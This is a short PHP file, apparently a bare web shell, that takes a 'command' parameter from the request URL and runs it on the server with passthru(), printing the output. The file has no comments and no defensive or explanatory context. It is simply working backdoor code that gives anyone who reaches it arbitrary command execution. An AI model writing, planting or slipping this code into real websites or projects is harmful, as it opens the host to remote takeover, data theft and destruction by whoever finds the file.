<?php
  $cmd = $_GET["command"];
  echo "<pre>";
  passthru($cmd);
  echo "</pre>";
?>
